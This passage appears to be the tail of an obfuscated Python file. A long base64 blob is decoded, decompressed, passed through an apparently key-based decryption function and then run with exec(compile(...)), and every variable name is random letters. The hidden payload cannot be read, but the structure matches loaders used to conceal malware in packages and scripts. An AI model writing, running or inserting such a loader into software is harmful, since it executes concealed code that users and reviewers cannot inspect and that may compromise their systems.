u9sFjAnYHZbj478OEbPCT7YGaBkK26zwCWgkNpdukiCZStIWfzAoEvT00NmHDMZ5mop2fzpXRXnpZQ6E26KZScMaXfCKYpbpmNOG5xj5hxZ5es6Zvc1b+jcolrOjXJWmFEXR/BY3VNdskn7sXwJEAEnPkQB78dmRmtP0NnVW+KmJbGE4eKBTBCupvcK6ESjH1VvhQ1jP0Sfk5v5j9ktctPmo2h1qVqqV9XuJa0/lWqX6uK9tNm/grp0BER43zQK/F5PP+E9P2e0zY5yfM5sJ/JFVbu70gnkLhSoFFW0g1S6eCoZmKWCbKaPjv6H3EXXy63y9DWsEn/SS405zbf1bud1bkYVwRSGSXQH6Q7MQ6lG4Sypz52nO/n79JVsaezpUqVuNeWufR35ZLK5ENpam1JXZz9MgqehH1wqQcU1hAK0nFNGE7GDb6mOh6V3EoEmd2+sCsQwIGbhMgR3Ky+uVKqI0Kg4FCss1ndTWrjMMDxT7Mlp9qM8GhOsKE/sK3+eYPtO0KHDAQ0PVal+hi2TnEq3GfMRem+aDfwtIB3lXwnsCZq7GXaacmVTCZEMUMKAKtUEJwA4AmO1Ah4dmTmVdqYowSkrGeVyj6IMUzk1UWkCRZeMmejB5bXHwEvpJjz8cM9dAefp/ildblVBaDwQpmCbodHqETv+EKItjREoV90/wcilISl0Vo9Sq6+QB94mkHmfPAGu8ZH+5U61NJWu1wn9OLCKWAzeqO6YvPODCH+bloVB1rI6HYUPFW0qtJbNgYANdDrlwn4jDrMAerwtz8thJcKxqeYXB/16F7D4CQ/pT9Iiku73Az+ETIc+NDsfNxxIiwI9VSiWhi8yvZ9pSQ/LR4WKvz4j+GRqF6TSM9BOUzgDpMcAbJg88A6gPdHfmdbpfJz/k7BJC8XiAf2VTVaqm6g05eWKYizM6+MN4AIdfxsYoJgpRaveh8qPygw+tyCd/vKOKh5jXQ0ZZ3ZN5BWtai9xJu2Cwe229bGryJOjix2rOaqfbTzfevns2dTDwUWrhk8zmlw0oIJuj+9HeSJPtjc2X2xYW0+tr/+69dnTry+/aSNP3KdUyBSwRB2xZZ4HAAVUhxZQrpWVKzaiqpXPjumeZPrnbnTpVKQ6iQOmk+/GD4/dIvTaljhQmjJOF2snSZkvRypX7nvtOkMF/WBpIZEg/T0s7XpM2msPdarYz4FIrpCAHlCq8agky4af/Jkh/ingqt60LCRqWU0xbYIG8EqVKGR0/gFkGhSN'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
